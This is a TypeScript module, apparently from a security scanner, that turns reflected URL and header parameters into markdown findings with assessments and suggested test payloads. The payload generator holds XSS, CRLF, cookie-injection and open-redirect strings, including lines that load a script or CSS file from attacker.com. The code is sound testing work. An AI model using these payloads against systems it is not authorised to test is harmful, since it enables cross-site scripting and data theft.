import {
  AnalyzedReflectedParameter,
  SeverityTier,
  RedirectPosition,
  SEVERITY_ORDER
} from "../core/types.js";
import { prettyPrintContext, toCanonical, CONTEXT } from "./contextMap.js";
import { mergeEncodedSignals, EncodedSignalEntry } from "./mergeEncodedSignals.js";
import { getSubdomainBreakoutChars } from "./redirectAnalysis.js";

export { prettyPrintContext as canonicalizeContext };

export interface RequestContext {
  method: string;
  url: string;
  statusCode: number;
  contentType?: string;
  csp?: string;
  xcto?: string;
}

function tierLabel(tier: SeverityTier): string {
  return tier.charAt(0).toUpperCase() + tier.slice(1);
}

function formatChar(ch: string): string {
  if (ch === " ") return "`space`";
  if (ch === "") return "`alphanumeric`";
  return `\`${ch}\``;
}

function truncate(s: string, max: number): string {
  if (s.length <= max) return s;
  return s.slice(0, max - 1) + "…";
}

function escapeMarkdown(s: string): string {
  return s.replace(/[`|\\]/g, c => `\\${c}`);
}

function hasClosingTagBreakout(chars: string[]): boolean {
  return chars.some(c => /^<\/[a-z]+>$/i.test(c));
}

function generateAssessment(
  context: string,
  chars: string[],
  headers?: string[],
  redirectPosition?: RedirectPosition
): string {
  const canonical = toCanonical(context) ?? context;
  const hasQuote = chars.includes('"') || chars.includes("'");
  const hasLt = chars.includes('<');
  const quote = chars.includes('"') ? '"' : "'";

  if (canonical === CONTEXT.RESPONSE_SPLITTING) {
    return "CRLF injection — full response splitting possible";
  }
  if (canonical === CONTEXT.JS_URI) {
    return "JavaScript URI injection (direct XSS)";
  }
  if (canonical === CONTEXT.JS_TEMPLATE_LITERAL) {
    if (chars.includes('$') && chars.includes('{')) {
      return "Template literal expression hole injection (direct execution)";
    }
    if (chars.includes('`')) return "Template literal breakout via backtick";
    return "JS template literal reflection";
  }
  if (canonical === CONTEXT.JS_IN_QUOTE) {
    const parts: string[] = [];
    if (hasQuote) parts.push(`String breakout via \`${quote}\``);
    if (hasLt) parts.push("script escape via `<`");
    if (parts.length) return parts.join(", ");
    return "Script string reflection, no breakout chars confirmed";
  }
  if (canonical === CONTEXT.JS) {
    if (hasLt) return "Script escape via `<`";
    return "Script reflection, no breakout chars confirmed";
  }
  if (canonical === CONTEXT.EVENT_HANDLER) {
    if (chars.length > 0) return "Event handler injection";
    return "Event handler reflection, no chars confirmed";
  }
  if (canonical === CONTEXT.IMPORT_MAP || canonical === CONTEXT.IMPORT_MAP_STRING) {
    return "Import map injection — can redirect ES module imports";
  }
  if (canonical === CONTEXT.DATA_URI) {
    if (chars.length > 0) return "Data URI injection in src/object/embed attribute";
    return "Data URI reflection";
  }
  if (canonical === CONTEXT.ATTRIBUTE_IN_QUOTE) {
    if (hasQuote) return `Attribute breakout via \`${quote}\``;
    return "Quoted attribute reflection, no quote breakout";
  }
  if (canonical === CONTEXT.ATTRIBUTE) {
    if (chars.includes(' ')) return "Unquoted attribute injection";
    return "Unquoted attribute reflection";
  }
  if (canonical === CONTEXT.DOM_CLOBBER) {
    return "DOM clobbering potential via id/name attribute";
  }
  if (canonical === CONTEXT.RAWTEXT_ELEMENT) {
    if (hasClosingTagBreakout(chars) && hasLt) {
      const tag = chars.find(c => /^<\/[a-z]+>$/i.test(c)) ?? "</element>";
      return `Element escape via \`${tag}\` + tag injection`;
    }
    return "RAWTEXT/RCDATA element reflection (requires closing tag escape)";
  }
  if (canonical === CONTEXT.SVG_CONTEXT) {
    if (hasLt) return "SVG namespace reflection — SVG-specific event handlers available";
    return "SVG namespace reflection";
  }
  if (canonical === CONTEXT.MATH_CONTEXT) {
    if (hasLt) return "MathML namespace reflection — mutation XSS vectors available";
    return "MathML namespace reflection";
  }
  if (canonical === CONTEXT.HTML_BASE_INJECTION) {
    if (hasLt) return "`<base>` tag injection possible — can hijack relative script/form URLs";
    return "Early HTML reflection before relative URLs";
  }
  if (canonical === CONTEXT.HTML) {
    if (hasLt) return "Tag injection possible";
    return "HTML reflection, no tag injection chars";
  }
  if (canonical === CONTEXT.HTML_COMMENT) {
    return "HTML comment reflection";
  }
  if (canonical === CONTEXT.CSS || canonical === CONTEXT.CSS_IN_QUOTE) {
    if (chars.includes('@')) return "CSS injection with @-rule support (data exfiltration via @import)";
    return "Style injection";
  }
  if (canonical === CONTEXT.JSON_STRUCTURE) {
    if (hasLt && chars.includes('/')) return "`</script>` breakout from JSON script block — full XSS";
    if (hasLt) return "JSON script block with `<` — tag injection after breakout";
    return "JSON structure injection";
  }
  if (canonical === CONTEXT.JSON_STRING) {
    if (hasLt && chars.includes('/')) return "`</script>` breakout from JSON script block — full XSS";
    if (hasLt) return "JSON script block with `<` — tag injection after breakout";
    return "JSON string reflection (escaped)";
  }
  if (canonical === CONTEXT.RESPONSE_HEADER || headers?.length) {
    const hdrLower = headers?.map(h => h.toLowerCase()) ?? [];
    if (hdrLower.includes("location") || hdrLower.includes("refresh")) {
      return redirectAssessment(redirectPosition, chars);
    }
    if (hdrLower.includes("set-cookie")) return "Cookie injection";
    if (hdrLower.includes("content-security-policy")) return "CSP bypass";
    if (hdrLower.includes("access-control-allow-origin")) {
      return "CORS misconfiguration";
    }
    return "Response header reflection";
  }
  return "Reflection detected";
}

function redirectAssessment(
  position: RedirectPosition | undefined,
  chars: string[]
): string {
  switch (position) {
    case 'full-url':
      return "Open redirect — full URL control";
    case 'scheme':
      return "Scheme injection — protocol manipulation";
    case 'host':
      return "Open redirect — host control";
    case 'subdomain': {
      const breakouts = getSubdomainBreakoutChars(chars);
      if (breakouts.length > 0) {
        const charList = breakouts.map(c =>
          c === '\\' ? '`\\\\`' : `\`${c}\``
        ).join(', ');
        return `Open redirect — subdomain breakout via ${charList}`;
      }
      return "Subdomain injection";
    }
    case 'path':
      return "Path manipulation in redirect";
    case 'query':
      return "Parameter injection in redirect";
    case 'fragment':
      return "Fragment injection in redirect";
    default:
      return "Open redirect";
  }
}

function generateTestPayload(
  context: string,
  chars: string[],
  headers?: string[],
  redirectPosition?: RedirectPosition
): string | undefined {
  const canonical = toCanonical(context) ?? context;
  const hasQuote = chars.includes('"') || chars.includes("'");
  const hasLt = chars.includes('<');
  const quote = chars.includes('"') ? '"' : "'";

  if (canonical === CONTEXT.RESPONSE_SPLITTING) {
    return `%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>`;
  }
  if (canonical === CONTEXT.JS_URI) {
    return `alert(1)//`;
  }
  if (canonical === CONTEXT.JS_TEMPLATE_LITERAL) {
    if (chars.includes('$') && chars.includes('{')) return `\${alert(1)}`;
    if (chars.includes('`') && hasLt) return `\`</script><svg onload=alert(1)>`;
    if (chars.includes('`')) return `\`-alert(1)-\``;
    return undefined;
  }
  if (canonical === CONTEXT.JS_IN_QUOTE) {
    if (hasQuote && hasLt) {
      return `${quote}</script><svg onload=alert(1)>`;
    }
    if (hasQuote) return `${quote}-alert(1)-${quote}`;
    if (hasLt) return `</script><svg onload=alert(1)>`;
    return undefined;
  }
  if (canonical === CONTEXT.JS) {
    if (hasLt) return `</script><svg onload=alert(1)>`;
    return undefined;
  }
  if (canonical === CONTEXT.EVENT_HANDLER) {
    if (chars.length > 0) return `)-alert(1)-(`;
    return undefined;
  }
  if (canonical === CONTEXT.IMPORT_MAP || canonical === CONTEXT.IMPORT_MAP_STRING) {
    return `https://attacker.com/malicious.js`;
  }
  if (canonical === CONTEXT.DATA_URI) {
    return `data:text/html,<script>alert(1)</script>`;
  }
  if (canonical === CONTEXT.ATTRIBUTE_IN_QUOTE) {
    if (hasQuote) {
      return `${quote} onfocus=alert(1) autofocus=${quote}`;
    }
    return undefined;
  }
  if (canonical === CONTEXT.ATTRIBUTE) {
    if (chars.includes(' ')) return `x onfocus=alert(1) autofocus`;
    return undefined;
  }
  if (canonical === CONTEXT.RAWTEXT_ELEMENT) {
    const closingTag = chars.find(c => /^<\/[a-z]+>$/i.test(c));
    if (closingTag && hasLt) {
      return `${closingTag}<img src=x onerror=alert(1)>`;
    }
    return undefined;
  }
  if (canonical === CONTEXT.SVG_CONTEXT) {
    if (hasLt) return `<animate onbegin=alert(1)>`;
    return undefined;
  }
  if (canonical === CONTEXT.MATH_CONTEXT) {
    if (hasLt) return `</math><img src=x onerror=alert(1)>`;
    return undefined;
  }
  if (canonical === CONTEXT.HTML_BASE_INJECTION) {
    if (hasLt) return `<base href="https://attacker.com/">`;
    return undefined;
  }
  if (canonical === CONTEXT.HTML) {
    if (hasLt) return `<img src=x onerror=alert(1)>`;
    return undefined;
  }
  if (canonical === CONTEXT.JSON_STRING || canonical === CONTEXT.JSON_STRUCTURE) {
    if (hasLt && chars.includes('/')) return `</script><svg onload=alert(1)>`;
    return undefined;
  }
  if (canonical === CONTEXT.CSS || canonical === CONTEXT.CSS_IN_QUOTE) {
    if (chars.includes('@')) return `@import url(https://attacker.com/exfil.css)`;
    return undefined;
  }
  if (canonical === CONTEXT.RESPONSE_HEADER || headers?.length) {
    const hdrLower = headers?.map(h => h.toLowerCase()) ?? [];
    if (hdrLower.includes("location") || hdrLower.includes("refresh")) {
      return redirectTestPayload(redirectPosition, chars);
    }
    if (hdrLower.includes("set-cookie")) return `; domain=attacker.com`;
    return undefined;
  }
  return undefined;
}

function redirectTestPayload(
  position: RedirectPosition | undefined,
  chars: string[]
): string {
  switch (position) {
    case 'full-url':
      return 'https://evil.com/';
    case 'scheme':
      return 'http';
    case 'host':
      return 'evil.com';
    case 'subdomain': {
      const breakouts = getSubdomainBreakoutChars(chars);
      if (breakouts.length > 0) return `evil.com${breakouts[0]}`;
      return 'evil';
    }
    case 'path':
      return '../../../evil-page';
    case 'query':
      return '&evil=injected';
    case 'fragment':
      return '#evil-fragment';
    default:
      return 'https://evil.com';
  }
}

function buildSnippets(
  matches: Array<[number, number]>,
  body: string,
  maxSnippets = 3
): string[] {
  if (!body) return [];
  const snippets: string[] = [];
  const limit = Math.min(matches.length, maxSnippets);
  for (let i = 0; i < limit; i++) {
    const [start, end] = matches[i];
    if (start === 0 && end === 0 && matches.length > 1) continue;
    const lo = Math.max(0, start - 40);
    const hi = Math.min(body.length, end + 40);
    const prefix = lo > 0 ? "..." : "";
    const suffix = hi < body.length ? "..." : "";
    const slice = body.slice(lo, hi).replace(/\n/g, " ");
    snippets.push(
      `\`${prefix}${escapeMarkdown(slice)}${suffix}\` (offset ${start})`
    );
  }
  return snippets;
}

export function generateReport(
  param: AnalyzedReflectedParameter,
  responseBody?: string
): string {
  const pretty = prettyPrintContext(param.context) ?? param.context;
  const count = Array.isArray(param.matches) ? param.matches.length : 0;
  const tier = tierLabel(param.severity);
  const status = param.confirmed ? "**Confirmed**" : "**Unconfirmed**";

  let out = `### ${param.name} · ${pretty} · ${tier}\n`;

  const meta: string[] = [];
  if (param.source) meta.push(`**Source:** ${param.source}`);
  if (param.value != null) {
    meta.push(`**Value:** \`${truncate(param.value, 60)}\``);
  }
  meta.push(status);
  meta.push(`${count} reflection${count === 1 ? "" : "s"}`);
  out += meta.join(" · ") + "\n";

  if (param.otherContexts) {
    const others = Object.entries(param.otherContexts)
      .filter(([, c]) => c > 0)
      .sort((a, b) => b[1] - a[1])
      .map(([k, c]) => {
        const label = prettyPrintContext(k) ?? k;
        return c > 1 ? `${label} ×${c}` : label;
      })
      .join(", ");
    if (others) out += `Also in: ${others}\n`;
  }

  if (param.headers?.length) {
    out += `**Headers:** ${param.headers.join(", ")}\n`;
  }

  if (param.aggressive?.length) {
    out += `\n**Reflected chars:** ${param.aggressive.map(formatChar).join(" ")}\n`;
  }

  const assessment = generateAssessment(
    param.context, param.aggressive ?? [], param.headers,
    param.redirectPosition
  );
  const payload = generateTestPayload(
    param.context, param.aggressive ?? [], param.headers,
    param.redirectPosition
  );
  const quoteParts = [assessment];
  if (payload) quoteParts.push(`Test: \`${payload}\``);
  out += `\n> ${quoteParts.join(". ")}\n`;

  const canonical = toCanonical(param.context) ?? param.context;
  if (responseBody && canonical !== CONTEXT.RESPONSE_HEADER) {
    const snippets = buildSnippets(param.matches, responseBody);
    if (snippets.length) {
      out += `\n**Snippets:**\n`;
      snippets.forEach((s, i) => { out += `${i + 1}. ${s}\n`; });
    }
  }

  return out;
}

export function buildRequestContextLine(ctx: RequestContext): string {
  const parts = [
    `\`${ctx.method}\``,
    `\`${ctx.url}\``,
    `\`${ctx.statusCode}\``
  ];
  if (ctx.contentType) {
    const ct = ctx.contentType.split(";")[0].trim();
    parts.push(`\`${ct}\``);
  }
  if (!ctx.csp) parts.push("No CSP");
  if (!ctx.xcto) parts.push("No X-Content-Type-Options");
  return parts.join(" · ");
}

function decodeEvidence(enc: string): string | undefined {
  const urlMatch = enc.match(/^%([0-9a-f]{2})$/i);
  if (urlMatch) {
    return String.fromCharCode(parseInt(urlMatch[1], 16));
  }
  const uniMatch = enc.match(/^\\u([0-9a-f]{4})$/i);
  if (uniMatch) {
    return String.fromCharCode(parseInt(uniMatch[1], 16));
  }
  const entityMap: Record<string, string> = {
    "&lt;": "<", "&gt;": ">", "&amp;": "&",
    "&quot;": '"', "&#39;": "'"
  };
  if (entityMap[enc]) return entityMap[enc];
  return undefined;
}

export function buildEncodedSignalsSection(
  encodedSignals: EncodedSignalEntry[] | undefined
): string {
  if (!encodedSignals?.length) return "";
  const merged = mergeEncodedSignals(encodedSignals);
  let out = "#### Encoded reflections (informational)\n";
  for (const { name, contexts, evidence, count } of merged.values()) {
    const prettyContexts = Array.from(contexts)
      .map(c => prettyPrintContext(c) ?? c)
      .join(", ");
    const pairs = Array.from(evidence).map(e => {
      const decoded = decodeEvidence(e);
      return decoded ? `\`${e}\`→\`${decoded}\`` : `\`${e}\``;
    }).join(", ");
    out += `- **${name}** → ${prettyContexts} (≈${count} matches · ${pairs})\n`;
  }
  return out;
}

export function buildStructuredDataBlock(
  params: AnalyzedReflectedParameter[]
): string {
  const data = params.map(p => ({
    param: p.name,
    source: p.source ?? "URL",
    context: p.context,
    severity: p.severity,
    confirmed: p.confirmed,
    chars: p.aggressive ?? [],
    reflections: Array.isArray(p.matches) ? p.matches.length : 0
  }));
  return `<!-- REFLECTOR_DATA\n${JSON.stringify(data)}\n-->`;
}

function headerVulnLabel(
  param: AnalyzedReflectedParameter
): string | undefined {
  const names = new Set(param.headers?.map(h => h.toLowerCase()) ?? []);
  if (names.has('location') || names.has('refresh')) {
    const pos = param.redirectPosition;
    if (pos === 'full-url' || pos === 'host' || pos === 'scheme'
        || pos === 'subdomain') {
      return 'Open Redirect';
    }
  }
  const chars = param.aggressive ?? [];
  if (names.has('set-cookie') && chars.includes(';')) return 'Cookie Injection';
  if (names.has('content-security-policy')
      && (chars.includes(';') || chars.includes("'") || chars.includes('*'))) {
    return 'CSP Injection';
  }
  if (names.has('access-control-allow-origin')) return 'CORS Misconfiguration';
  return undefined;
}

function headerContextLabel(
  param: AnalyzedReflectedParameter
): string {
  const canonical = toCanonical(param.context) ?? param.context;
  if (canonical !== CONTEXT.RESPONSE_HEADER || !param.headers?.length) {
    return prettyPrintContext(param.context) ?? param.context;
  }
  const headerList = param.headers.slice(0, 2).join(", ");
  const extra = param.headers.length > 2
    ? ` +${param.headers.length - 2}` : '';
  return `${headerList}${extra} Header`;
}

export function buildFindingTitle(
  params: AnalyzedReflectedParameter[],
  hasLiteral: boolean
): string {
  if (!params.length) return "Encoded reflections (informational)";

  const sorted = [...params].sort(
    (a, b) => SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity]
  );
  const topTier = sorted[0].severity;

  const confirmed = sorted.filter(p => p.confirmed);
  const display = confirmed.length ? confirmed : sorted;
  const names = display.slice(0, 2).map(p => `"${p.name}"`);
  const contexts = [
    ...new Set(display.slice(0, 2).map(p => headerContextLabel(p)))
  ];

  const vuln = display.slice(0, 2)
    .map(p => headerVulnLabel(p))
    .find(v => v !== undefined);

  const prefix = hasLiteral ? "Reflected" : "Encoded reflections";
  const suffix = vuln ? ` — ${vuln}` : '';
  return `${prefix}: (${tierLabel(topTier)}) ${names.join(", ")} in ${contexts.join(", ")}${suffix}`;
}
